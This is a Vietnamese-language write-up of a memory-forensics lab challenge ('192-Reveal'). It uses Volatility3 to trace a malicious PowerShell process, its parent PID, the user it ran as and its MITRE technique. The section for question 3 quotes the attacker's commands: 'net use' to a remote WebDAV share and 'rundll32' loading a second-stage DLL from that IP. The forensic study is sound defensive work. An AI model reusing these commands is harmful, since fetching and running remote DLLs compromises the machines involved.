## Câu hỏi 1: Việc xác định tên của tiến trình độc hại giúp hiểu được bản chất của cuộc tấn công. Tên của tiến trình độc hại là gì?
Đầu tiên tôi tải về file .dmp tôi cũng không biết đấy là file gì. Sau đó tôi đã tìm hiểu được file dump là file dump bộ nhớ, chứa bộ nhớ của toàn ram  
Tôi tìm được vài gợi ý là dùng WinDbg để phân tích file .dmp và tôi cũng thử dùng nhưng không tìm được gì. Sau đó tôi chuyển sang tool volatility3 để phân tích  
Dùng câu lệnh   
`cd "C:\Users\Admin\volatility3"`  
`python .\vol.py -f "C:\Users\Admin\Downloads\192-Reveal\temp_extract_dir\192-Reveal.dmp" windows.pslist`

![{C4FB18C9-E830-42B2-9EC8-3455A0010872}](https://github.com/user-attachments/assets/2c4c2dc5-d22d-4c0e-860c-3cf2bebc2ff9)
Như hình ảnh tôi thấy powershell.exe thì tôi nghĩ đây cũng là tiến trình nguy hiểm vì PowerShell cho phép thực thi các câu lệnh, script phức tạp, quản lý hệ thống, tự động hóa rất nhiều tác vụ. Điều này khiến nó là công cụ yêu thích của nhiều attacker để khai thác, tấn công hoặc thực thi mã độc.
## Câu hỏi 2: Biết ID tiến trình cha (PPID) của tiến trình độc hại giúp theo dõi phân cấp tiến trình và hiểu được luồng tấn công. PID cha của tiến trình độc hại là gì?
![{6EF24DE6-EC94-4BB2-AAA5-773C4C563AA7}](https://github.com/user-attachments/assets/b53486e9-06fb-434e-b8a4-929636b7b6b6)
![{D2AC4E6A-E0D8-456B-B081-D52A1A110A05}](https://github.com/user-attachments/assets/aa300963-f0d7-4b5b-a2da-3803840bfb29)
PID là 	Mã định danh tiến trình còn PPID là Mã định danh tiến trình cha của tiến trình đấy suy ra tiến trình cha của powershell.exe là 4120
## Câu hỏi 3: Việc xác định tên tệp mà phần mềm độc hại sử dụng để thực hiện tải trọng giai đoạn thứ hai là rất quan trọng để xác định các hoạt động độc hại tiếp theo. Tên tệp mà phần mềm độc hại sử dụng để thực hiện tải trọng giai đoạn thứ hai là gì?
![{45C64BB2-C4A0-487F-9C1F-5070F0770F63}](https://github.com/user-attachments/assets/c92c3af9-d686-4183-abc2-c7aaddefde68)
Ta có thể thấy powershell được chạy trong tình trạng ẩn cửa sở không cho người dùng thấy được sự bất thường của hoạt động.  
`net use \45.9.74.32@8888\davwwwroot`   
Lệnh `net use` dùng để kết tới 1 thư mục chia sẻ mạng (network share)  
Ở đây, nó đang kết nối tới một mục chia sẻ trên máy chủ mạng có ip `45.9.74.32` và cổng `8888` với tên thư mục `davwwwroot`  
`rundll32 \45.9.74.32@8888\davwwwroot\3435.dll,entry`  
Lệnh này dùng `rundll32.exe` để gọi hàm entry từ DLL có tên `3435.dll` tải trực tiếp từ thư mục chia sẻ mạng trên IP `45.9.74.32` cổng `8888`.  
Điều này có nghĩa là phần mềm độc hại đang tải và thực thi mã độc giai đoạn thứ hai trực tiếp trong bộ nhớ, không cần lưu file trên ổ cứng.
## Câu hỏi 4: Việc xác định thư mục chia sẻ trên máy chủ từ xa giúp theo dõi các tài nguyên mà kẻ tấn công nhắm tới. Tên của thư mục chia sẻ đang được truy cập trên máy chủ từ xa là gì?
Thư mục đấy là `davwwwroot` được tôi giải thích trên cùng với câu hỏi 3.
## Câu hỏi 5 : ID kỹ thuật phụ MITRE ATT&CK mô tả quá trình thực thi tải trọng giai đoạn thứ hai bằng tiện ích Windows để chạy tệp độc hại là gì?
![image](https://github.com/user-attachments/assets/2345e022-29e9-4038-b72a-69e40b5e0bd9)
## Câu hỏi 6: Việc xác định tên người dùng mà quy trình độc hại chạy dưới đó giúp đánh giá tài khoản bị xâm phạm và tác động tiềm ẩn của nó. Tên người dùng mà quy trình độc hại chạy dưới đó là gì?
`python vol.py -f "C:\Users\Admin\Downloads\192-Reveal\temp_extract_dir\192-Reveal.dmp" windows.getsids.GetSIDs --pid 3692`  
![{72386146-F2DF-4DA2-B2A7-A545E5553F04}](https://github.com/user-attachments/assets/1c1f823f-a043-4042-85eb-7b5b885c2aa1)
## Câu hỏi 7: Biết tên của họ phần mềm độc hại là điều cần thiết để liên hệ cuộc tấn công với các mối đe dọa đã biết và phát triển các biện pháp phòng thủ phù hợp. Tên của họ phần mềm độc hại là gì?
![image](https://github.com/user-attachments/assets/5be31447-ec84-4fb7-8ca7-59f4b4395ae9)
